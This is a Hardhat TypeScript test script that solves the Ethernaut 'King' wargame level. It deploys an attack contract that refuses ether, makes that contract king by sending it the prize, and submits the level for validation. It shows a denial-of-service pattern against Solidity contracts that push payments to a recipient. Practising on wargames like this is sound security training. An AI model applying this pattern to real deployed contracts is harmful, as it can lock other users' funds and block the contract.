// # Ethernaut 9: King

import {ethers} from 'hardhat'
import {BigNumber, Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK, expectStatusFail} from './testUtil'

const LEVEL_ADDRESS = '0x5cECE66f3EB19f7Df3192Ae37C27D96D8396433D'
const INSTANCE_ADDRESS = '0x60022492342EC56e68c3E460ff7BD957Fdc74afe'

describe('09 King', () => {
  let ethernaut: Contract
  let instance: Contract
  let attack: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('King', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  it('deploys attack contract with ether equal to current prize', async () => {
    const prize: BigNumber = await instance.prize()

    const factory = await ethers.getContractFactory('KingAttack')
    attack = await factory.deploy({value: prize, gasLimit: 1000000})
    await attack.deployTransaction.wait()

    return expect(await provider.getBalance(attack.address)).to.eq(prize)
  })

  it('verifies attack contract does not accept ether', async () => {
    const params = {to: attack.address, value: ethers.utils.parseEther('0.0001'), gasLimit: 1000000}
    const tx = await signer.sendTransaction(params)
    return expectStatusFail(tx)
  })

  it('lets attack contract send its balance to instance', async () => {
    const tx = await attack.sendEtherTo(instance.address, {gasLimit: 1000000})
    return expectStatusOK(tx)
  })

  it('verifies attack contract has become king', async () => {
    const king = await instance._king()
    expect(king).to.equal(attack.address)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
